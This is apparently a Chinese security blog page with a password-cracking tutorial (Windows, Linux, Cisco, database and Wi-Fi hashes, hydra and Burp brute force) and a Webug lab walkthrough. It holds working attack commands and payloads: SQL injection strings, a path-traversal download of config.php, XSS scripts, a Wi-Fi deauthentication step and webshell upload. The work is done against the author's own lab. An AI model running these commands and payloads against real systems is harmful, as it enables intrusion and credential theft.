<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.09.05.png" alt="img"></p>
<p>用管理员权限打开wce，从而获得Windows的NTML HASH</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.10.25.png" alt="img"></p>
<p>还可以利用wce直接获取Windows的密码（-w参数是通过摘要式认证缓存一个明文的密码）：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/BDD60E9E-A4AA-4443-B846-B2217A7A0206.png" alt="img"></p>
<p>密码破解：</p>
<p>环境：Windows10（CPU：i5；GPU：gtx860）</p>
<p>工具：hashcat、hashsuite</p>
<p>操作：</p>
<p>1.使用hashcat进行密码的破解</p>
<p>hashcat参数简介：</p>
<p>-m 这个是指定破解的hash的类型，具体的类型可以在–help参数中看到。 默认是0也就是MD5，而NTLM则是1000。 </p>
<p>-a 指定破解的模式，默认是字典模式 </p>
<p>-o 输出文件，破解成功的密码存放的文件 </p>
<p>–remove移除破解成功的hash，当hash是从文本中读取时有用，避免自 己手工移除已经破解的hash</p>
<p>–username 忽略用户名，如果你的hash文件中是username:hash这种格式只 需要指定这个参数，就不需要再手工编辑了 </p>
<p>-r 指定规则文件，字典根据规则文件做变形，用于破解相似密码当-a指定为3 时，就是暴力破解模式，这个模式下需要自己指定mask和长度。</p>
<p>Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。 </p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028814.png" alt="img"></p>
<p>2.使用SAMInside.exe进行密码破解</p>
<p>环境：Windows10</p>
<p>1）使用管理员身份运行SAMInside.exe</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028815.png" alt="img"></p>
<p>2）你可以选择使用Pwdump7获取口令之后将其导入SAMInside.exe进行破解；或者使用SAMInside.exe来直接获取本地口令进行破解（本例使用第二种方式，点击三个小人的图标然后选择import local users via scheduler将本地用户的hash导出来）。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/62EA4762-1EEB-4C95-B04D-A092175F1118.png" alt="img"></p>
<p>3）选择用户加载字典来进行爆破，最终可以看到已经破解了口令</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/B20BF1A6-DA9E-43C2-AA15-DC90419A748F.png" alt="img"></p>
<p>注：由于我之前载入字典破解了本地密码所以在每次导入时均会显示已经破解了密码</p>
<p>3.使用hashsuite可以直接进行windows的NTML HASH的抓取与破解。但是前提依旧是在管理员权限下进行</p>
<p>环境：windows10</p>
<p>1）首先以管理员身份运行hashsuite</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028818.png" alt="img"></p>
<p>2）导入要破解的口令，在这里我们选择导入本地的口令（选择后软件会自动将口令进行提取）</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028819.png" alt="img"></p>
<p>3）之后我们选择使用字典破解的方式对账户Assassin001的口令进行破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028820.png" alt="img"></p>
<p>####2.Linux密码破解</p>
<p>知识概要：</p>
<p>▶ head -n 2 /etc/passwd</p>
<p>root;x:0:0:root:/root:/usr/bin/zsh</p>
<p>daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin</p>
<p>以”:”分隔，共有七个字段：</p>
<p>1.账号名称；2.密码（Linux早期密码存放地，现在均存在/etc/shadow中）；3.UID（用户标识符）；4.GID；5.用户信息说明列；6.主文件夹；7.shell</p>
<p>▶ head -n 2 /etc/shadow</p>
<p>root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7:::</p>
<p>daemon:*:17043:0:99999:7:::</p>
<p>以”:”分隔，共有九个字段：</p>
<p>1.账号名称；2.密码；3.最近更新密码的日期；4.密码不可被更动的天数；5.密码需要重新更改的天数；6.密码需要更改期限前的警告天数；7.密码过期后的账号宽限时间；8.账号失效日期；9.保留</p>
<p>密码抓取：</p>
<p>环境：kali linux</p>
<p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p>
<p>工具：mimipenguin(Linux下的mimikatz)</p>
<p>操作：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.28.10.png" alt="img"></p>
<p>密码破解：</p>
<p>环境：kali linux</p>
<p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p>
<p>工具：John the ripper</p>
<p>操作：</p>
<p>1.使用unshadow命令创建1个含有用户名和密码详细信息的文件</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.25.01.png" alt="img"></p>
<p>2.使用John来破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.29.10.png" alt="img"></p>
<p>####3.网络设备密码破解</p>
<p>环境：windows7</p>
<p>工具：Cain</p>
<p>操作：</p>
<p>破解Cisco中Password 7加密，密文为052C3C5F70420F1A0E</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028822.png" alt="img"></p>
<p>环境：kali linux</p>
<p>工具：John the ripper</p>
<p>操作：</p>
<p>1.将密文整理成cisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211，保存在文件中然后使用john进行破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028823.png" alt="img"></p>
<p>####4.数据库密码破解</p>
<p>环境：windows10 MSSQL数据库</p>
<p>工具：Cain</p>
<p>操作：</p>
<p>1.添加Hash到队列</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028825.png" alt="img"></p>
<p>2.开始暴力破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028826.png" alt="img"></p>
<p>环境：windows10  MYSQL数据库</p>
<p>工具：Cain</p>
<p>操作：</p>
<p>1.执行SELECT password,USER() FROM mysql.user;来获取密文</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028827.png" alt="img"></p>
<p>2.将MYSQL的密文导入Cain</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028828.png" alt="img"></p>
<p>3.使用字典攻击模式进行攻击</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028829.png" alt="img"></p>
<p>环境：windows10 Oracle数据库</p>
<p>工具：Cain</p>
<p>操作：</p>
<p>1.导入Oracle数据库账号密码</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028830.png" alt="img"></p>
<p>2.进行暴力破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028831.png" alt="img"></p>
<p>####5.无线密码破解</p>
<p>环境：kali linux 、WPA/WPA2 PSK加密  无线路由器  TP-LINK_4D16、Windows10（hashcat进行GPU运算）</p>
<p>工具：外置USB无线网卡  </p>
<p>操作：</p>
<ol>
<li>把网卡切换为监听模式</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo airmon-ng start wlan0</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028835.png" alt="img"></p>
<p>2.监听网络流量信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo airodump-ng -w file wlan0mon</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028836.png" alt="img"></p>
<ol>
<li>使用mdk3， 强制断线路由的所有链接， 此次操作是为了能让aircrack抓到wifi的握手信息 ， -c为需要强制断线的信道：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mdk3 wlan0mon d -c 11</div></pre></td></tr></table></figure>
<p>过了几分钟， 可以看到， 用户重新连接上了901路由， 我们也捕获到了handshake信息， 上面airodump-ng的命令窗口顶部出现了以下信息 WPA handshake  ，此时直接ctrl＋c ，停止捕获信息</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028837.png" alt="img"></p>
<p>在kali的Home目录下生成了了几个文件 ，此时的file-01.cap为最重要的文件：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028838.png" alt="img"></p>
<p>4.把文件转换为hccapx格式， 我们打开这个网站：<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="external">https://hashcat.net/cap2hccapx/</a> ， 然后选择cap文件并点击covert按钮， 并下载一个hccapx格式的文件</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028839.png" alt="img"></p>
<p>5.网页会返回一个hccapx的文件， 使用hashcat命令破解， 参数dict.txt为生成的字典文件 ， -m参数2500代表破解的方式为WPA/WPA2， 999.hccapx为生成的文件， 最后破解出来的密码为whitehat：</p>
<p>PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028840.png" alt="img"></p>
<p>####6.web应用破解</p>
<p>环境：Windows10（phpstudy搭建漏洞靶场DVWA的爆破模块）</p>
<p>工具：burpsuite</p>
<p>操作：</p>
<p>1.使用burpsuite抓取登录时候的数据包</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.39.49.png" alt="img"></p>
<p>2.将数据包发送至Intruder模块并对攻击点进行标注</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.02.png" alt="img"></p>
<p>3.载入攻击字典并进行暴力破解</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.13.png" alt="img"></p>
<p>4.暴力破解后效果</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.41.42.png" alt="img"></p>
<p>5.验证破解密码是否正确（一般观察Length和Status来判断正确的密码）</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.07.png" alt="img"></p>
<p>6.如果密码不正确的页面截图</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.20.png" alt="img"></p>
<p>环境：Windows7</p>
<p>工具：AWVS 10.5版本</p>
<p>操作：</p>
<p>1.设置浏览器代理访问登录界面使用burpsuite抓取登录请求包</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028850.png" alt="img"></p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028851.png" alt="img"></p>
<p>2.在AWVS扫描器中的HTTP Fuzzer模块填入刚抓的登录过程的HTTP数据包</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028852.png" alt="img"></p>
<p>3.在Generator中可以看到很多方式,可以使用AWVS自带的生成器,也可以选择File Generator来使用自己生成的字典.还可以设定是否编码.最后在需要穷举的地方指定变量,对应的是你Generator的name属性.图中的蓝色字体部分.</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028853.png" alt="img"></p>
<p>4.点击start，观察响应体可以看出爆破成功密码为password</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028854.png" alt="img"></p>
<p>####7.在线扫描破解hydra</p>
<p>环境：Windows10（FileZilla Server搭建的ftp服务器）、kali linux（预装了hydra）</p>
<p>测试用户：test：123456</p>
<p>操作：</p>
<p>1）启动ftp服务，启动成功后可以使用我添加的测试账户登录ftp读取我电脑E盘的文件</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028855.png" alt="img"></p>
<p>2）使用hydra来进行爆破</p>
<p>命令为：</p>
<p>hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp</p>
<p>-l LOGIN 小写，用于指定破解的用户，对特定用户破解</p>
<p>-L FILE 大写，用于指定用户的用户名字典</p>
<p>-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典</p>
<p>-P FILE 大写，用于指定密码字典</p>
<p>-vV为显示详细的爆破过程</p>
<p>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</p>
<p>最后加上目标ip以及需要进行爆破的协议即可</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028856.png" alt="img"></p>
<p>3）显示成功后进行登录验证，发现可以成功登录</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/1028857.png" alt="img"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/24/Webug渗透基础教程/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/24/Webug渗透基础教程/" itemprop="url">
                  Webug渗透基础教程
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-24T16:14:18+08:00">
                2017-10-24
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/10/24/Webug渗透基础教程/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/24/Webug渗透基础教程/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/10/24/Webug渗透基础教程/" class="leancloud_visitors" data-flag-title="Webug渗透基础教程">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>####普通的GET注入</p>
<p>解法一：使用sqlmap</p>
<p>1）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -b –current-db –current-user</p>
<p>可以看到当前的数据库名称以及用户名称</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p>
<p>2）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab –tables</p>
<p>可以看到pentesterlab中有那些数据表</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p>
<p>3）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag –columns</p>
<p>显示出该表下的所有列</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p>
<p>4）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag -C flag –dump</p>
<p>得到flag:204f704fbbcf6acf398ffee11989b377</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p>
<p>解法二：手工进行注入</p>
<p>1）先通过order by 子句判断有几个字段。</p>
<p><a href="http://172.16.193.128" target="_blank" rel="external">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+</p>
<p>当order by 后加数字为5的时候报错因而判断有4个表</p>
<p>2）爆数据库</p>
<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
<p>3）爆表名</p>
<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+</p>
<p>4）爆列名</p>
<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+</p>
<p>参考：</p>
<p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/29942.html</a></p>
<p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="external">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p>
<p>####从图片中你能找到什么？</p>
<p>1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk</p>
<p>2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p>
<p>3）分离文件（当然你把文件后缀修改为rar也是可以的）</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p>
<p>4）直接看123.txt的内容是：密码是123。之后post这个密码就好</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p>
<p>他题没有出好，咱们的思路是没有问题的。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p>
<p>####你看到了什么？</p>
<p>1）题目不明确的时候就看源码，源码注释部分有扫目录的提示</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p>
<p>2）使用工具扫描目录</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p>
<p>其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p>
<p>3）看一眼诡异的test</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p>
<p>4）然后就解答了</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p>
<p>####告诉你了FLANG是5位数</p>
<p>1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破</p>
<p>2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p>
<p>3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现）</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p>
<p>####一个优点小小的特殊的注入</p>
<p>1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p>
<p>2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For”   text.txt文件的内容为你抓的包）。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p>
<p>最后成功注入得到flag</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p>
<p>注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。</p>
<p>一下是使用cobra检测的结果：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" alt="img"></p>
<p>####这关需要RMB购买哦</p>
<p>1）点开可以看到只有一个登陆框，查看源代码看是否有tips,</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="屏幕快照 2017-10-22 下午8.51.55"></p>
<p>果真是有提示的：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="屏幕快照 2017-10-22 下午9.02.58"></p>
<p>2）跟着提示走，猜测是否可能为注入，但是当我访问链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</div></pre></td></tr></table></figure>
<p>却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="屏幕快照 2017-10-22 下午9.05.03"></p>
<p>3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖</p>
<p>####越权</p>
<p>1）让修改密码所以目标就很明确了，我要越权修改别人的密码</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="屏幕快照 2017-10-22 下午10.11.33"></p>
<p>8.csrf</p>
<p>题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="屏幕快照 2017-10-24 上午10.39.23"></p>
<p>我们可以来测试一下效果：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="屏幕快照 2017-10-24 上午10.42.42"></p>
<p>首先我们访问我们的PoC</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="屏幕快照 2017-10-24 上午10.42.57"></p>
<p>之后点击submit便可以看到提示修改密码成功：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="屏幕快照 2017-10-24 上午10.43.04"></p>
<p>####URL跳转</p>
<p>看到题目的提示我突然想到前面在源码中看到的一个提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</div></pre></td></tr></table></figure>
<p>####文件下载</p>
<p>直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="屏幕快照 2017-10-24 上午10.54.40"></p>
<p>可以看到这个index.php是有问题的，所以我们直接看download.php即可</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="屏幕快照 2017-10-24 上午10.59.28"></p>
<p>觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="屏幕快照 2017-10-24 上午11.08.29"></p>
<p>发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了）</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="屏幕快照 2017-10-24 上午11.10.34"></p>
<p>成功发现config.php，之后我们构造PoC进行下载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</div></pre></td></tr></table></figure>
<p>之后打开就可以找到密码了，并不需要进一步对数据库做什么。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="屏幕快照 2017-10-24 上午11.13.29"></p>
<p>####我和上题有点像</p>
<p>这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="屏幕快照 2017-10-24 上午11.54.08"></p>
<p>####我系统密码忘记了</p>
<p>1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="屏幕快照 2017-10-24 下午12.00.24"></p>
<p>2）发现没有任何过滤，所以之后使用cknife进行连接</p>
<p>3）上传mimikatz抓取管理员密码即可</p>
<p>####xss</p>
<p>无任何过滤的一个反射型xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="屏幕快照 2017-10-24 下午12.12.35"></p>
<p>####存储型xss</p>
<p>也是不存在任何的过滤，只需要在留言处填写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="屏幕快照 2017-10-24 下午12.16.02"></p>
<p>####什么？图片上传不了？</p>
<p>1）上传一张图片</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="屏幕快照 2017-10-24 下午3.05.40"></p>
<p>2）上传php脚本</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="屏幕快照 2017-10-24 下午3.05.56"></p>
<p>3）不能是图片还不能是脚本，我们看下处理的逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span 